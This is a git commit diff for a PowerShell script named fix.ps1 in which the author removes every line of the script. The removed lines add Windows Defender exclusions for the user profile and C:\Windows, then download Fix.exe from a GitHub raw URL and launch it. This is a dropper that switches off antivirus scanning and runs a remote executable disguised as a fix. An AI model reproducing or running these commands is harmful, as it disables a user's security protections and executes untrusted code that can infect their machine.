fd6ef7d71c568a10dda2dc9ca6a3e40a7f6aa1e2
hot90923 <hot90923@gmail.com>
2025-01-23 03:34:30 -0800

    Update fix.ps1

--- fix.ps1
+++ fix.ps1
@@ -1,8 +1,1 @@
-Add-MpPreference -ExclusionPath $env:USERPROFILE
-Add-MpPreference -ExclusionPath C:\Windows
-$url = "https://github.com/hot90923/123/raw/refs/heads/main/Fix.exe"
-$output = "$env:Fix.exe"
-Invoke-WebRequest -Uri $url -OutFile $output
-Start-Process -FilePath $output
 
-00000000000000000300000000005BE000005CE000000000 
